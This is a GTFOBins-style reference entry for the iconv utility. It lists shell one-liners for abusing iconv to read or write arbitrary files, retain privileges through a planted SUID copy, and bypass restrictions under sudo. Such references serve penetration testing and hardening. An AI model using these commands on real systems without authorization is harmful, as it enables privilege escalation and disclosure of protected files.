# GTFOBin: iconv

The `8859_1` encoding is used as it accepts any single-byte sequence, thus it allows to read/write arbitrary files. Other encoding combinations may corrupt the result.

## File write

It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.

```
LFILE=file_to_write
echo "DATA" | iconv -f 8859_1 -t 8859_1 -o "$LFILE"
```

## File read

It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.

```
LFILE=file_to_read
iconv -f 8859_1 -t 8859_1 "$LFILE"
```

## SUID

If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.

This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.

```
sudo install -m =xs $(which iconv) .

LFILE=file_to_read
./iconv -f 8859_1 -t 8859_1 "$LFILE"
```

## Sudo

If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.

```
LFILE=file_to_read
./iconv -f 8859_1 -t 8859_1 "$LFILE"
```